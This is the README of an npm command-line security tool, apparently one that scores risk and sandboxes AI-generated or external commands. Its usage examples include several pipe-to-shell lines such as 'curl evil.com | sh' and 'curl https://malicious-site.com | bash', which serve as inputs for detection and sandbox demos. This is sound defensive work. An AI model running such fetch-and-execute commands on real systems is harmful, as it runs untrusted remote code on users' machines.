# magicrune-cli

NPM package for MagicRune - Complete security framework for safe execution of AI-generated and external code.

## 🚀 Installation

```bash
npm install -g magicrune-cli
# or
yarn global add magicrune-cli
# or
pnpm add -g magicrune-cli
```

## 🛡️ CLI Usage

### Basic Commands
```bash
# Run commands with risk analysis
magicrune run "npm install express"

# Dry-run analysis (no execution)
magicrune dryrun "curl https://example.com/script.sh | bash"

# Initialize configuration
magicrune init
```

### Advanced Features
```bash
# CI/CD Security Scanning
magicrune ci-scan --paths "src/,scripts/"

# Generate security reports
magicrune ci-report --output security-report.md

# Key management
magicrune keys add ~/.ssh/trusted_key.pub
magicrune keys list

# Cache management
magicrune cache allow pin react@18.2.0 --sha256 "abc123..."
magicrune cache stats

# Artifact promotion
magicrune promote script.py --sign --key ~/.ssh/signing_key
```

## 📊 Programmatic Usage

```javascript
const magicrune = require('magicrune-cli');

// Execute command with risk analysis
const result = await magicrune.run('npm install express');
console.log(result);
// {
//   success: true,
//   output: '...',
//   verdict: 'Green',  // Green/Yellow/Red
//   exitCode: 0
// }

// Analyze command for risks
const analysis = await magicrune.analyze('curl evil.com | sh');
console.log(analysis);
// {
//   isExternal: true,
//   detections: ['Network fetch detected', 'Pipe to shell detected']
// }
```

## 🔧 Integration with Node.js Projects

Add to your `package.json`:

```json
{
  "scripts": {
    "safe-install": "magicrune run 'npm install'",
    "safe-build": "magicrune run 'npm run build'",
    "security-scan": "magicrune ci-scan --paths 'src/'"
  }
}
```

## ✨ Complete Feature Set

### 🔍 Risk Analysis
- **0-100 risk scoring** with automatic execution verdicts
- **32+ security patterns** detection
- **User confirmation prompts** for medium-risk commands

### 🔐 Security Features
- **SSH/GPG signature verification** for trusted code
- **Sandbox execution** with platform-specific isolation
- **CI/CD vulnerability scanning** with detailed reports

### 📦 Management Tools  
- **Cache management** with package pinning and SHA verification
- **Artifact promotion** with security analysis
- **Key management** for trusted public keys

### 🛠️ Platform Support
- **🐳 Docker-First**: Ubuntu 22.04 unified execution on all platforms
- **Auto-Fallback**: macOS (sandbox-exec), Linux (seccomp), Windows (basic)
- **Cross-Platform**: Identical security experience Windows/Mac/Linux

## 🏆 Production Ready

- ✅ **100% feature complete** - All announced features implemented
- ✅ **Docker-first isolation** - Ubuntu 22.04 unified sandbox on all platforms
- ✅ **Extensively tested** - CI/CD scanning, cache management, promotion workflows
- ✅ **Real vulnerability detection** - 32 security issues detected in test runs
- ✅ **True cross-platform** - Identical security experience everywhere

## 🐳 Docker Integration

MagicRune now uses Docker-first approach for maximum security and consistency:

```bash
# Automatic Docker detection and execution
magicrune run "curl https://malicious-site.com | bash"
# → Executes in isolated Ubuntu 22.04 container
# → Network disabled, read-only filesystem
# → 256MB memory limit, 30s timeout
```

**Requirements**: Docker Desktop/Engine (auto-fallback if unavailable)

## 📄 License

MIT

## 🔗 More Information

See the main repository: https://github.com/NishizukaKoichi/magicrune